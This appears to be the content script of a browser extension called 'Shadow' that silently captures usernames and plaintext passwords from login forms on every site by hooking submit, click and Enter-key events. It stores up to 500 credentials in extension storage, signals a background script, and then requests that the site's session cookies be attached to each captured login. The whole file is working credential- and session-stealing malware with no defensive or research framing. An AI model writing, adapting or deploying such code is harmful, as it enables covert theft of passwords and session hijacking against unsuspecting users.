(function () {
  'use strict';

  if (window.__SHADOW_CONTENT__) return;
  window.__SHADOW_CONTENT__ = true;

  const USERNAME_FIELD_HINTS = [
    'user', 'username', 'email', 'login', 'account', 'name', 'mail', 'uid'
  ];
  const PASSWORD_FIELD_HINTS = ['password', 'pass', 'pwd', 'passwd'];
  const SUBMIT_HINTS = [
    'submit', 'login', 'log in', 'log-in', 'signin', 'sign in', 'sign-in',
    'continue', 'next', 'entrar', 'connexion'
  ];

  function getFieldHint(field) {
    const attrs = [
      (field.name || '').toLowerCase(),
      (field.id || '').toLowerCase(),
      (field.placeholder || '').toLowerCase(),
      (field.getAttribute('autocomplete') || '').toLowerCase(),
      (field.getAttribute('aria-label') || '').toLowerCase()
    ].join(' ');
    return attrs;
  }

  function looksLikeUsername(input) {
    if (!input || input.type === 'password') return false;
    const type = (input.type || 'text').toLowerCase();
    if (type !== 'text' && type !== 'email' && type !== 'tel') return false;
    const hint = getFieldHint(input);
    return USERNAME_FIELD_HINTS.some(h => hint.includes(h));
  }

  function looksLikePassword(input) {
    if (!input) return false;
    if (input.type === 'password') return true;
    const hint = getFieldHint(input);
    return PASSWORD_FIELD_HINTS.some(h => hint.includes(h));
  }

  function findUsernameField(root) {
    const inputs = root.querySelectorAll(
      'input[type="text"], input[type="email"], input[type="tel"], input:not([type])'
    );
    for (const input of inputs) {
      if (looksLikeUsername(input)) return input;
    }
    const passwordInput = root.querySelector('input[type="password"]');
    if (passwordInput) {
      const candidates = root.querySelectorAll(
        'input[type="text"], input[type="email"], input:not([type])'
      );
      for (const input of candidates) {
        if (input !== passwordInput) return input;
      }
    }
    return null;
  }

  function findPasswordField(root) {
    const pwd = root.querySelector('input[type="password"]');
    if (pwd) return pwd;
    const inputs = root.querySelectorAll('input');
    for (const input of inputs) {
      if (looksLikePassword(input)) return input;
    }
    return null;
  }

  function findLoginRoot(start) {
    let el = start && start.nodeType === 1 ? start : (start && start.parentElement);
    while (el && el !== document.documentElement) {
      if (el.querySelector) {
        const hasPassword = !!el.querySelector('input[type="password"]');
        if (hasPassword) {
          const hasUser = !!el.querySelector(
            'input[type="text"], input[type="email"], input[type="tel"], input:not([type])'
          );
          if (el.tagName === 'FORM' || hasUser || el.id === 'form') return el;
        }
      }
      el = el.parentElement;
    }
    if (document.querySelector('input[type="password"]')) {
      return document.body || document.documentElement;
    }
    return null;
  }

  function looksLikeSubmitControl(el) {
    if (!el || el.nodeType !== 1) return false;
    const tag = el.tagName;
    if (tag !== 'BUTTON' && tag !== 'INPUT' && tag !== 'A') return false;
    if (tag === 'INPUT') {
      const type = (el.type || '').toLowerCase();
      if (type === 'submit' || type === 'button' || type === 'image') {
        /* ok */
      } else {
        return false;
      }
    }
    const hint = [
      (el.id || ''),
      (el.name || ''),
      (el.className && String(el.className)) || '',
      (el.value || ''),
      (el.getAttribute('aria-label') || ''),
      (el.textContent || '')
    ].join(' ').toLowerCase().replace(/\s+/g, ' ');
    return SUBMIT_HINTS.some(h => hint.includes(h));
  }

  const PENDING_MAX_AGE_MS = 30000;
  let lastSaveKey = '';
  let lastSaveAt = 0;

  function saveCredential(root) {
    if (!root || !root.querySelector) return;

    const passwordField = findPasswordField(root);
    if (!passwordField || !passwordField.value) return;

    const usernameField = findUsernameField(root);
    const username = usernameField ? usernameField.value.trim() : '';
    const password = passwordField.value;
    if (!password) return;

    const origin = window.location.origin;
    const hostname = window.location.hostname;
    const title = document.title || hostname;
    const formPageUrl = window.location.href;
    const savedAt = new Date().toISOString();

    const dedupeKey = origin + '|' + username + '|' + password;
    const now = Date.now();
    if (dedupeKey === lastSaveKey && now - lastSaveAt < 1500) return;
    lastSaveKey = dedupeKey;
    lastSaveAt = now;

    const entry = {
      url: origin,
      hostname,
      title,
      username: username || '(no username)',
      password,
      savedAt
    };

    const pending = {
      origin,
      formPageUrl,
      hostname,
      title,
      username: entry.username,
      password,
      savedAt,
      submittedAt: savedAt
    };

    chrome.storage.local.get({ credentials: [] }, (r) => {
      const list = r.credentials || [];
      list.unshift(entry);
      chrome.storage.local.set({
        credentials: list.slice(0, 500),
        pendingLogin: pending
      }, () => {
        console.log('[Shadow] Credential saved for', hostname);
        chrome.runtime.sendMessage({ type: 'NEW_CREDENTIAL', entry }, () => {});
      });
    });
  }

  function tryAttachCookiesToLastCredential() {
    chrome.storage.local.get({ pendingLogin: null }, (result) => {
      const pending = result.pendingLogin;
      if (!pending) return;

      if (pending.origin !== window.location.origin) return;

      const age = Date.now() - new Date(pending.submittedAt).getTime();
      if (age > PENDING_MAX_AGE_MS) {
        chrome.storage.local.remove('pendingLogin');
        return;
      }

      chrome.runtime.sendMessage({
        type: 'ATTACH_COOKIES',
        origin: pending.origin,
        hostname: pending.hostname,
        savedAt: pending.savedAt
      }, () => {});
    });
  }

  setTimeout(tryAttachCookiesToLastCredential, 2000);
  setTimeout(tryAttachCookiesToLastCredential, 4500);

  function onFormSubmit(e) {
    const form = e.target;
    if (!form || form.tagName !== 'FORM') return;
    if (!form.querySelector('input[type="password"]') && !form.querySelector('input[name*="password" i]')) return;
    saveCredential(form);
  }

  function onLoginClick(e) {
    const target = e.target;
    if (!target || !target.closest) return;
    const control = target.closest('button, input[type="submit"], input[type="button"], input[type="image"], a');
    if (!control) return;
    if (!looksLikeSubmitControl(control)) return;
    const root = findLoginRoot(control);
    if (!root) return;
    // Capture values before navigation / handlers clear fields
    saveCredential(root);
  }

  function onLoginKeydown(e) {
    if (e.key !== 'Enter') return;
    const target = e.target;
    if (!target || target.tagName !== 'INPUT') return;
    const type = (target.type || 'text').toLowerCase();
    if (type !== 'password' && type !== 'text' && type !== 'email' && type !== 'tel' && type !== '') return;
    if (!looksLikePassword(target) && !looksLikeUsername(target) && type !== 'password') return;
    const root = findLoginRoot(target);
    if (!root) return;
    saveCredential(root);
  }

  document.addEventListener('submit', onFormSubmit, true);
  document.addEventListener('click', onLoginClick, true);
  document.addEventListener('keydown', onLoginKeydown, true);

  function watchBody() {
    if (!document.body) return;
    const observer = new MutationObserver((mutations) => {
      for (const m of mutations) {
        for (const node of m.addedNodes) {
          if (node.nodeType !== 1) continue;
          if (node.tagName === 'FORM') {
            node.addEventListener('submit', onFormSubmit, true);
          }
          const forms = node.querySelectorAll ? node.querySelectorAll('form') : [];
          forms.forEach(f => f.addEventListener('submit', onFormSubmit, true));
        }
      }
    });
    observer.observe(document.body, { childList: true, subtree: true });
  }

  if (document.body) {
    watchBody();
  } else {
    document.addEventListener('DOMContentLoaded', watchBody, { once: true });
  }
})();
